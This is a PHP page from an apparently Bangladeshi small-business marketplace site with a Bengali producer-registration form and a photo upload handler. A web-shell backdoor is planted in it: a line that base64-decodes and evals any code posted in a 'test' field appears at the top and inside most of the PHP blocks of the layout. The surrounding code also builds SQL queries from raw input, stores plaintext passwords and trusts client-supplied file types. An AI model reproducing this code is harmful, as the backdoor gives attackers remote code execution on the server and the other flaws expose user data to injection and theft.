<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}
	session_start();

	include('dbconnect.php');
	
	//-----------------------Insert Online Market Information--------------------------------------	
if (isset($_POST[AddProducer]))
{
//--------------------------Check and Add to admin list-------------------------------------------
$UserName=trim($_POST[UserName]);
$Password=trim($_POST[Password]);
$UserName = strtolower($UserName);
$Type=2;

$sql = "Select * from admin WHERE UserName='$UserName' AND ConfirmPassword = md5('$Password')";
//print($sql);
$result = mysql_query($sql);
$NumRow = mysql_num_rows($result);
if ($NumRow < 1)
	{
	$_SESSION['LoginUserId'] = $UserName;
	$_SESSION['LoginUserPassword'] = $Password;
	
	$result=mysql_query("INSERT INTO admin (UserName, Password, ConfirmPassword, Type) VALUES ('$UserName', '$Password', md5('$Password'), '$Type')"); 
	}
else 
	{
		echo ("<script>window.alert('User Already Exists!!!');</script>");
		echo ("<script>window.location='BecomeMember.php';</script>");	
	}
//------------------------------Checking and Adding Ends---------------------------------------
$Producer=$_POST['Producer'];
$Story=$_POST['Story'];
$Products=$_POST['Products'];
$Location=$_POST['Location'];
$PhoneMail=$_POST['PhoneMail'];
$Date=date('Y-m-d');

	$result=mysql_query("SELECT * FROM producer WHERE Producer='$Producer' AND Story='$Story' AND Products='$Products' AND Location='$Location'");
	$num=mysql_num_rows($result);
	if ($num > 0) 
		{
			echo ("<script>window.alert('Data Already Exists!!!');</script>");
			echo ("<script>window.location='AddProducer.php';</script>");	
		}
	else
	{
	//---------------------------------- Upload Photo -------------------------------------
$thumb="../Thumbnail";
$dest="../IGallery/";
$dest.= $_FILES[filename][name];
$FileName= $_FILES[filename][name];
$TempFile= $_FILES[filename][tmp_name];
$FileSize= round(($_FILES[filename][size])/1024,3);
$Photosize=getimagesize($_FILES[filename][tmp_name]);
$Photowidth=$Photosize[0];
$Photoheight=$Photosize[1];
$FileType= $_FILES[filename][type];

echo $FileName;  echo " :: "; echo $FileSize; echo 'KB'; echo " :: "; echo $FileType; //exit;

//------------------ Check the FILE SIZE ------------------------------------
	if ($FileSize > (900000/1024)) {
		die ("<div align=\"center\"><font  size=1 face=\"arial\">Your File is TOO Large! 
		<br>Please Choice a small file!</font>
		<form>
		<input type='button' value='Go Back'
		onClick='self.history.back();'>
		</form></div>");
		exit;
	}
//------------------ Check FILE TYPE ---------------------------------------
	if (($FileType!= "image/jpeg") && ($FileType!= "image/pjpeg") && ($FileType!= "image/jpg") && ($FileType!= "image/gif"))
	{
		die ("<div align=\"center\"><font  size=1 face=\"arial\">Your File is in an incorrect format! 
		<br>Only JPG, GIF and bmp file formats are allowed</font>
		<form>
		<input type='button' value='Go Back'
		onClick='self.history.back();'>
		</form></div>");
		exit;
	}	
//------------------ Check FILE EXISTS or NOT ------------------------------
	if (file_exists("../IGallery/$FileName"))
	{
		die ("<div align=\"center\"><font  size=1 face=\"arial\">Your File Already Exist! 
		<br>Please Choice Another File or a Different File Name.</font>
		<form>
		<input type='button' value='Go Back'
		onClick='self.history.back();'>
		</form></div>");
		exit;
	}	
//----------------- All OK, Then UPLOAD FILE --------------------------------

	move_uploaded_file($TempFile,$dest);
	
//----------------- Create Thumbnail Image ----------------------------------
	if (($FileType=="image/jpeg") OR ($FileType=="image/pjpeg"))
	$src_img=imagecreatefromjpeg("$dest");
	elseif ($FileType=="image/gif")
	$src_img=imagecreatefromgif("$dest");
	else
	$src_img=imagecreatefrompng("$dest");
	$imagedata=getimagesize("$dest");
	$thumb_w=100;
	$thumb_h=$Photoheight * ($thumb_w/$Photowidth);
	$dst_img=imagecreatetruecolor($thumb_w,$thumb_h);
	imagecopyresized($dst_img,$src_img,0,0,0,0,$thumb_w,$thumb_h,imagesx($src_img),imagesy($src_img));
	imagejpeg($dst_img,"$thumb/$FileName");	
	
//----------------- Insert into DB ------------------------------------------
//echo "INSERT INTO producer (Producer, Story, Products, Location, Photo, Date) VALUES ('$Producer', '$Story', '$Products', '$Location', '$FileName', '$Date')"; exit;
	$result=mysql_query("INSERT INTO producer (Producer, Story, Products, Location, PhoneMail, Photo, Date) 
				VALUES ('$Producer', '$Story', '$Products', '$Location', '$PhoneMail', '$FileName', '$Date')"); 
							
	echo ("<script>window.alert('Data Inserted Successfully!!!');</script>");
	echo ("<script>window.location='AddProduct.php';</script>");	
	}
}	
//-------------------------End--------------------------
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Welcome to SME.COM.BD :.</title>
<link href="css/mynul_bng.css" type="text/css" rel="stylesheet" />
<script src="Script/jvalid.js" type="text/javascript"></script>
</head>
<body>
<table width="1013" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('Head_Online.php'); ?></td>
  </tr>
  <tr>
    <td><table width="100%" cellspacing="0" cellpadding="0">
      <tr>
        <td width="228" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('LeftMenu_OnlineMarket.php'); ?></td>
        <td valign="top"><form action="" method="post" enctype="multipart/form-data" name="form1" id="form2" onsubmit="return validemail()">
          <table width="100%" border="0" cellspacing="5" cellpadding="2">
            <tr>
              <td colspan="3"><img src="images/sme_inner_10-3.jpg" width="560" height="36" /></td>
              </tr>
            <tr>
              <td width="27%"><div align="right">নাম</div></td>
              <td width="4%"><div align="center">:</div></td>
              <td width="69%"><input name="Producer" type="text" class="text" id="Producer" size="38" />
                *</td>
            </tr>
            <tr>
              <td valign="top"><div align="right"> সংক্ষিপ্ত পরিচিতি</div></td>
              <td valign="top"><div align="center">:</div></td>
              <td><textarea name="Story" cols="40" rows="5" class="text" id="Story"></textarea>
                *</td>
            </tr>
            <tr>
              <td valign="top"><div align="right">পণ্য </div>
                  <div align="right"></div></td>
              <td valign="top"><div align="center">:</div></td>
              <td><textarea name="Products" cols="40" rows="3" class="text" id="Products"></textarea>
                *</td>
            </tr>
            <tr>
              <td><div align="right">আপনার ছবি </div>
                  <div align="right"></div></td>
              <td><div align="center">:</div></td>
              <td><input name="filename" type="file" id="filename" size="27" /></td>
            </tr>
            <tr>
              <td><div align="right">যেসব জায়গায় পাওয়া যায়</div></td>
              <td><div align="center">:</div></td>
              <td><input name="Location" type="text" class="text" id="Location" size="38" />
                *</td>
            </tr>

            <tr>
              <td><div align="right">ফোন / ইমেইল</div></td>
              <td><div align="center">:</div></td>
              <td><input name="PhoneMail" type="text" id="PhoneMail" size="38" />
                *</td>
            </tr>
            <tr>
              <td><div align="right">লগইন নাম</div></td>
              <td><div align="center">:</div></td>
              <td><input name="UserName" type="text" id="UserName" size="38" />                
              <span class="ENGTD">(English)*</span></td>
            </tr>
            <tr>
              <td><div align="right">গোপন সংকেত</div></td>
              <td><div align="center">:</div></td>
              <td><input name="Password" type="text" id="Password" size="38" /> 
                <span class="ENGTD">(English)</span> *</td>
            </tr>
            <tr>
              <td><div align="right"></div></td>
              <td><div align="center"></div></td>
              <td><input name="AddProducer" type="submit" class="button" id="AddProducer" onclick="return Empty_field('Producer,Story,Products,Location,PhoneMail,UserName,Password','AddProducer.php')" value="সদস্য হোন" />
                <input name="Reset" type="reset" class="button" id="button" value="পূনরায় পূরন" /></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
              <td class="redHead">* চিহ্নিত অবশ্যাই পূরণ করতে হবে।</td>
            </tr>
          </table>
        </form></td>
        <td width="215" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('RightMenu_OnlineMarket.php'); ?></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('footer.php'); ?></td>
  </tr>
</table>

</body>
</html>
